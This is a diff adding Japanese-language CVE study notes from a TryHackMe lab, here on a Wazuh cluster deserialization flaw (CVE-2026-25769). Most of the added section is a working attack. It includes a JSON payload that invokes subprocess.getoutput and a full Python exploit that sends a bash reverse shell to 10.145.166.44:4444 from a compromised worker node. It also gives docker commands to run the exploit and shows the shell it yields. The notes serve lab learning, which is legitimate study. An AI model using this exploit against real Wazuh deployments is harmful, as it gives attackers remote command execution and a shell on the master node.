@@ -1,5 +1,100 @@
 # CVE
 
+## CVE-2026-25769 (Wazuh)
+
+https://tryhackme.com/room/wazuhcve202625769
+
+- 脅威の防止、検出、対応に使用される無料のオープンソースのセキュリティプラットフォーム
+- `4.0.0～4.14.2`
+- デシリアライズ
+- root権限のRCE
+
+クラスタ構成ファイル `ossec.conf` で定義されたFernet共通鍵で暗号化してメッセージを交換するが、ノードが認証されるとマスターは受信したコンテンツを全て暗黙的に信頼する。
+
+### 攻撃の流れ
+
+1. 攻撃者はワーカーノードを侵害する。（ワーカーはすでにFernetキーを保有している）
+2. 攻撃者は悪意のあるDAPIリクエストを送信する。
+3. マスターはメッセージを受信しデシリアライズし、攻撃者のコマンドが実行される。
+
+/var/ossec/etc/ossec.conf の例（※内容を区別するため master.xml, worker.xml と言及されるが、実際のファイル名は ossec.conf）
+
+```xml
+<ossec_config>
+  <global><jsonout_output>yes</jsonout_output></global>
+  <remote><connection>secure</connection><port>1514</port><protocol>tcp</protocol></remote>
+  <cluster>
+    <n>thm</n>
+    <node_name>master</node_name>
+    <node_type>master</node_type>
+    <key>WeKnowTryHackMeIsTheBestPlatform</key>
+    <port>1516</port>
+    <bind_addr>0.0.0.0</bind_addr>
+    <nodes><node>wazuh-master</node></nodes>
+    <disabled>no</disabled>
+  </cluster>
+</ossec_config>
+```
+
+ペイロード
+
+```json
+{
+    "f": {
+        "__callable__": {
+            "__name__": "getoutput",
+            "__module__": "subprocess",
+            "__qualname__": "getoutput"
+        }
+    },
+    "f_kwargs": {
+        "cmd": "whoami > /tmp"
+    },
+    "request_type": "local_master"
+}
+```
+
+エクスプロイト https://github.com/hakaioffsec/CVE-2026-25769
+
+```python
+#!/usr/bin/env python3
+import sys, json, asyncio, importlib.util
+
+def load_module(path):
+    spec = importlib.util.spec_from_file_location('m', path)
+    m = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(m)
+    return m
+
+# Payload: Master will execute subprocess.getoutput(cmd="...")
+PAYLOAD = {
+    "f": {"__callable__": {"__name__": "getoutput", "__module__": "subprocess", "__qualname__": "getoutput"}},
+    "f_kwargs": {"cmd": "bash -c 'bash -i >& /dev/tcp/10.145.166.44/4444 0>&1'"},
+    "request_type": "local_master"
+}
+
+async def main():
+    lc = load_module('/var/ossec/framework/wazuh/core/cluster/local_client.py').LocalClient()
+    await lc.start()
+    print(f"Sending: {json.dumps(PAYLOAD)}")
+    await lc.execute(command=b'dapi', data=json.dumps(PAYLOAD).encode())
+    print("Check the listener running on 10.145.166.44:4444 to confirm the shell")
+
+asyncio.run(main())
+```
+
+```sh
+ubuntu@tryhackme:~/$ sudo docker cp poc.py worker:/exploit/poc.py
+Successfully copied 2.56kB to worker:/exploit/poc.py
+ubuntu@tryhackme:~/$ sudo docker exec worker /var/ossec/framework/python/bin/python3 /exploit/poc.py
+```
+
+```sh
+bash-5.2$ id
+id
+uid=999(wazuh) gid=999(wazuh) groups=999(wazuh),0(root)
+```
+
 ## CVE-2025-58360 (GeoServer XXE)
 
 https://tryhackme.com/room/geoservercve202558360
